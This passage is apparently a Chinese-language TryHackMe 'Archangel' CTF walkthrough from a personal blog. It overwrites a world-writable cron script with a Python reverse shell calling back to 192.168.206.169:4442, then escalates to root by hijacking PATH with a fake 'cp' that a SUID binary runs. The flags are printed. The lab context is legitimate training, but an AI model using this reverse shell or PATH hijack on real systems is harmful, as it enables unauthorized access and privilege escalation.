+<p>查看用户 <code>archangel</code> 的可执行文件，有一个 <code>helloworld.sh</code></p>
+<p>而且<code> www-data</code> 用户有对该文件的修改权限</p>
+<pre class="line-numbers language-none"><code class="language-none">$ find &#x2F; -user archangel -type f 2&gt;&#x2F;dev&#x2F;null                
+&#x2F;opt&#x2F;helloworld.sh
+&#x2F;home&#x2F;archangel&#x2F;.selected_editor
+&#x2F;home&#x2F;archangel&#x2F;.profile
+&#x2F;home&#x2F;archangel&#x2F;user.txt
+&#x2F;home&#x2F;archangel&#x2F;.bash_logout
+&#x2F;home&#x2F;archangel&#x2F;.bashrc
+$ cat &#x2F;opt&#x2F;helloworld.sh
+
+#!&#x2F;bin&#x2F;bash
+echo &quot;hello world&quot; &gt;&gt; &#x2F;opt&#x2F;backupfiles&#x2F;helloworld.txt
+
+$ ls -al &#x2F;opt&#x2F;helloworld.sh
+-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 &#x2F;opt&#x2F;helloworld.sh
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查看定时任务，发现该文件每分钟会以 <code>archangel </code> 权限执行一次</p>
+<pre class="line-numbers language-none"><code class="language-none">$ cat &#x2F;etc&#x2F;crontab
+
+SHELL&#x3D;&#x2F;bin&#x2F;sh
+PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin
+
+# m h dom mon dow user  command
+*&#x2F;1 *   * * *   archangel &#x2F;opt&#x2F;helloworld.sh
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>修改该文件，将反弹命令写进去</p>
+<pre class="line-numbers language-none"><code class="language-none">cat &gt; helloworld.sh &lt;&lt; &#39;EOF&#39;
+#!&#x2F;usr&#x2F;bin&#x2F;python3
+import socket,subprocess,os
+s&#x3D;socket.socket()
+s.connect((&quot;192.168.206.169&quot;,4442))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])
+EOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再开一个窗口进行监听，等一会就成功拿到权限</p>
+<p>在 <code>secret </code>找到第二个 <code>flag</code>，同时还有一个 <code>SUID</code> 二进制文件</p>
+<pre class="line-numbers language-none"><code class="language-none">archangel@ubuntu:~$ cd secret
+cd secret
+archangel@ubuntu:~&#x2F;secret$ ls -al
+ls -al
+total 32
+drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
+drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
+-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
+-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
+archangel@ubuntu:~&#x2F;secret$ cat user2.txt
+cat user2.txt
+thm&#123;h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将该文件下载到本地分析</p>
+<p>该文件会执行 <code>cp</code> 命令</p>
+<p><img src="/../image/TryHackMe/easy/Archangel/cp.png"></p>
+<p>在 <code>/tmp</code> 目录下创建一个假的 <code>cp</code> 命令，并赋予 <code>777</code> 权限</p>
+<p>修改 <code>PATH</code> 环境变量，让系统优先使用我们伪造的 <code>cp</code></p>
+<pre class="line-numbers language-none"><code class="language-none">archangel@ubuntu:~$ cd &#x2F;tmp
+archangel@ubuntu:&#x2F;tmp$ echo -e &#39;#!&#x2F;bin&#x2F;bash\n&#x2F;bin&#x2F;bash -p&#39; &gt; &#x2F;tmp&#x2F;cp
+archangel@ubuntu:&#x2F;tmp$ chmod +x &#x2F;tmp&#x2F;cp
+archangel@ubuntu:&#x2F;tmp$ export PATH&#x3D;&#x2F;tmp:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行 <code>./backup</code>，成功提权</p>
+<pre class="line-numbers language-none"><code class="language-none">archangel@ubuntu:~&#x2F;secret$ .&#x2F;backup
+.&#x2F;backup
+id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1001(archangel)
+cat &#x2F;root&#x2F;root.txt
+thm&#123;p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Archangel.html">https://x9wd09ncc.github.io/post/TryHackMe_Archangel.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break Out The Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Break Out The Cage</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_tomghost.html" title="TryHackMe_tomghost"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_tomghost</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe-CyberHeroes.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TruHackMe_Valley.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Buleprint</div></div></a></div><div><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break Out The Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-16</div><div class="title">TryHackMe_Break Out The Cage</div></div></a></div><div><a href="/post/TryHackMe_Bugged.html" title="TryHackMe_Bugged"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Bugged</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
